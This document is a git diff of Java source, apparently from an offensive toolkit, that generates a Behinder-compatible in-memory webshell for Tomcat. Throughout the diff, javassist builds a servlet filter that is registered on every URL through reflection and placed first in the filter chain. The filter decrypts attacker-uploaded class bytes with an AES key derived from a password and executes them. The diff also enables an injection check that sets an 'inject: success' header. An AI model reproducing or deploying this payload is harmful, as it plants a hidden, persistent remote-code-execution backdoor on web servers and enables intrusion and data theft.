@@ -2,20 +2,13 @@ package cn.safe6.payload.memshell;
 
 import javassist.*;
 import org.apache.coyote.RequestInfo;
-import javax.servlet.jsp.PageContext;
 
 import javax.servlet.Filter;
+import javax.servlet.jsp.PageContext;
 
-public class Behinder {
+public class Behinder2 {
 
 
-    /**
-     * 此处用的是filter马，后面可以换成Listener马更香
-     * Safe6 2021.8.2
-     * @param pass
-     * @return
-     * @throws Exception
-     */
 
     public static byte[] getMemBehinder3Payload(String pass) throws Exception {
         //String pass = "rebeyond";
@@ -23,25 +16,24 @@ public class Behinder {
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(Filter.class));
         classPool.insertClassPath(new ClassClassPath(RequestInfo.class));
-        classPool.insertClassPath(new ClassClassPath(javax.servlet.jsp.PageContext.class));
-        classPool.insertClassPath(new ClassClassPath(Behinder.class));
+        classPool.insertClassPath(new ClassClassPath(PageContext.class));
+        classPool.insertClassPath(new ClassClassPath(Behinder2.class));
 
         String cname = "MemBehinder3"+ System.nanoTime();
         CtClass ctClass = classPool.makeClass("MemBehinder3");
         if (ctClass.getDeclaredConstructors().length != 0) {
             ctClass.removeConstructor(ctClass.getDeclaredConstructors()[0]);
         }
-        //ctClass.setSuperclass(classPool.getCtClass(Filter.class.getName()));
+        ctClass.setSuperclass(classPool.getCtClass(ClassLoader.class.getName()));
         ctClass.setInterfaces(new CtClass[]{classPool.getCtClass(Filter.class.getName())});
-        ctClass.addField(CtField.make("public javax.servlet.jsp.PageContext pageContext;",ctClass));
         ctClass.addField(CtField.make("public String passwd = \"" + pass + "\";", ctClass));
 
 
-        ctClass.addConstructor(CtNewConstructor.make("    public MemBehinder3(javax.servlet.jsp.PageContext pageContext){\n" +
-                "        this.pageContext = pageContext;\n" +
+        ctClass.addConstructor(CtNewConstructor.make("    public MemBehinder3(java.lang.ClassLoader c){\n" +
+                "        super(c);\n" +
                 "    }", ctClass));
 
-        //ctClass.addConstructor(CtNewConstructor.make("    public MemBehinder3(){}", ctClass));
+        ctClass.addConstructor(CtNewConstructor.make("    public MemBehinder3(){}", ctClass));
 
         ctClass.addMethod(CtMethod.make("public void init(javax.servlet.FilterConfig filterConfig) throws javax.servlet.ServletException {\n" +
                 "    }", ctClass));
@@ -57,20 +49,25 @@ public class Behinder {
                 "        return ret.substring(0,16).toLowerCase();\n" +
                 "    }", ctClass));
 
+        ctClass.addMethod(CtMethod.make("public Class g(byte[] b){\n" +
+                "   return super.defineClass(b, 0, b.length);\n }", ctClass));
+
         ctClass.addMethod(CtMethod.make("    public void doFilter(javax.servlet.ServletRequest servletRequest, javax.servlet.ServletResponse servletResponse, javax.servlet.FilterChain filterChain) throws java.io.IOException, javax.servlet.ServletException {\n" +
                 "\n" +
                 "        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) servletRequest;\n" +
                 "        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) servletResponse;\n" +
                 "        javax.servlet.http.HttpSession session = request.getSession();\n" +
                 "\n" +
-                "       // if (request.getParameter(\"test\").equals(\"ok\")) {\n" +
-                "            //response.setHeader(\"inject\", \"success\");\n" +
+                "        if (request.getParameter(\"test\").equals(\"ok\")) {\n" +
+                "            response.setHeader(\"inject\", \"success\");\n" +
+                "            Object[] obj =new Object[3];"+
+                            "obj[0]=request;\n" +
+                            "obj[1]=response;\n" +
+                            "obj[2]=session;\n"+
                 "            String k = md5(passwd);\n" +
                 "            session.putValue(\"u\", k);\n" +
                 "            // 回显密钥\n" +
                 "            try{\n" +
-                "                pageContext.setRequest(servletRequest);\n" +
-                "                pageContext.setResponse(servletResponse);\n" +
                 "                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
                 "                javax.crypto.spec.SecretKeySpec sec = new javax.crypto.spec.SecretKeySpec(k.getBytes(), \"AES\");\n" +
                 "                c.init(2, sec);\n" +
@@ -79,11 +76,11 @@ public class Behinder {
                 "                method.setAccessible(true);\n" +
                 "                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(upload));\n" +
                 "                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), new Object[]{evilclass_byte,new Integer(0), new Integer(evilclass_byte.length)});\n" +
-                "                evilclass.newInstance().equals(pageContext);\n" +
+                "                evilclass.newInstance().equals(obj);\n" +
                 "            }catch (Exception e){\n" +
                 "               e.printStackTrace();\n" +
                 "            }\n" +
-                "       // }\n" +
+                "        }\n" +
                 "        filterChain.doFilter(request, response);\n" +
                 "    }", ctClass));
 
@@ -92,7 +89,7 @@ public class Behinder {
 
 
 
-        ctClass.addMethod(CtMethod.make("    public static void dynamicAddFilter(javax.servlet.Filter filter, String name, String url, javax.servlet.http.HttpServletRequest request) throws IllegalAccessException {\n" +
+        ctClass.addMethod(CtMethod.make("    public static void addFilter(javax.servlet.Filter filter, String name, String url, javax.servlet.http.HttpServletRequest request) throws IllegalAccessException {\n" +
                 "        javax.servlet.ServletContext servletContext = request.getServletContext();\n" +
                 "        if (servletContext.getFilterRegistration(name) == null) {\n" +
                 "            java.lang.reflect.Field contextField = null;\n" +
@@ -116,6 +113,30 @@ public class Behinder {
                 "                filterStartMethod.setAccessible(true);\n" +
                 "                filterStartMethod.invoke(standardContext, null);\n" +
                 "                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);\n" +
+                "                Class filterMap;\n" +
+                "                try {\n" +
+                "                    filterMap = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterMap\");\n" +
+                "                } catch (Exception var23) {\n" +
+                "                    filterMap = Class.forName(\"org.apache.catalina.deploy.FilterMap\");\n" +
+                "                }\n" +
+                "\n" +
+                "                java.lang.reflect.Method findFilterMaps = standardContext.getClass().getMethod(\"findFilterMaps\",null);\n" +
+                "                Object[] filterMaps = (Object[])(findFilterMaps.invoke(standardContext,null));\n" +
+                "                Object[] tmpFilterMaps = new Object[filterMaps.length];\n" +
+                "                int index = 1;\n" +
+                "\n" +
+                "                for(int i = 0; i < filterMaps.length; ++i) {\n" +
+                "                    Object filterMapObj = filterMaps[i];\n" +
+                "                    findFilterMaps = filterMap.getMethod(\"getFilterName\",null);\n" +
+                "                    String name = (String)findFilterMaps.invoke(filterMapObj,null);\n" +
+                "                    if (name.equalsIgnoreCase(name)) {\n" +
+                "                        tmpFilterMaps[0] = filterMapObj;\n" +
+                "                    } else {\n" +
+                "                        tmpFilterMaps[index++] = filterMaps[i];\n" +
+                "                    }\n" +
+                "                }\n" +
+                "\n" +
+                "                java.lang.System.arraycopy(tmpFilterMaps, 0, filterMaps, 0, filterMaps.length);"+
                 "            } catch (Exception e) {\n" +
                 "\n" +
                 "            } finally {\n" +
@@ -129,9 +150,8 @@ public class Behinder {
                 "        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) context[0];\n" +
                 "        org.apache.catalina.connector.Response response = (org.apache.catalina.connector.Response) context[1];\n" +
                 "        javax.servlet.http.HttpSession session = (javax.servlet.http.HttpSession) context[2];\n" +
-                "        javax.servlet.jsp.PageContext page = (javax.servlet.jsp.PageContext) context[3];\n" +
                 "        try {\n" +
-                "            dynamicAddFilter(new MemBehinder3(page), \""+cname+"\", \"/*\", request);\n" +
+                "            addFilter(new MemBehinder3(), \""+cname+"\", \"/*\", request);\n" +
                 "        } catch (IllegalAccessException e) {\n" +
                 "            e.printStackTrace();\n" +
                 "        }\n" +
